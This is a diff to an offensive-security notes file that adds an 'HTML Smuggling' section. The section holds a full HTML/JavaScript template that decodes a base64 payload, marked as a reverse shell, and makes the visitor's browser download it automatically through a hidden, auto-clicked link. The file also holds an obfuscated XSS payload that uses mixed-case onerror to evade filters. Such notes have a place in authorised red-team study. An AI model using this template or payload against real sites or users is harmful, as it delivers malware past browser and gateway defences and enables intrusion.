@@ -1,5 +1,36 @@
 # Notes
 
+### HTML Smuggling (download automatically malicious file through JavaScript
+```
+<html>
+    <body>
+        <script>
+          function base64ToArrayBuffer(base64) {
+    		  var binary_string = window.atob(base64);
+    		  var len = binary_string.length;
+    		  var bytes = new Uint8Array( len );
+    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+    		  return bytes.buffer;
+      		}
+      		
+      		var file ='' !!! BASE64 encoded payload (reverse shell)
+      		var data = base64ToArrayBuffer(file);
+      		var blob = new Blob([data], {type: 'octet/stream'});
+      		var fileName = ''; !!! The filename
+      		
+      		var a = document.createElement('a');
+      		document.body.appendChild(a);
+      		a.style = 'display: none';
+      		var url = window.URL.createObjectURL(blob);
+      		a.href = url;
+      		a.download = fileName;
+      		a.click();
+      		window.URL.revokeObjectURL(url);
+        </script>
+    </body>
+</html>
+```
+
 ### Special XSS Payload (obfuscated)
 ```
 <img src=1 oNeRrOr=alert`1`>
